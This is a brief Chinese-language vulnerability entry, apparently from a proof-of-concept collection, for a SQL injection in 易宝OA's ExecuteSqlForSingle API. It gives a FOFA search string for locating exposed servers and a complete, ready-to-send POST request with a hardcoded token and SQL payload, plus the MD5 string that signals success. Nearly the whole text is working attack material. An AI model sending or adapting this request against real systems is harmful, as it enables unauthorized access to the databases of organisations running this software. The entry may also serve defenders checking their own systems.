## 易宝OA ExecuteSqlForSingle SQL注入漏洞

## fofa
```
"顶讯科技"
```

## poc
```
POST /api/system/ExecuteSqlForSingle HTTP/1.1
Host: IP:PORT
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Length: 103

token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
```
发送poc 在返回包中存在 `e10adc3949ba59abbe56e057f20f883e` 字符为存在漏洞

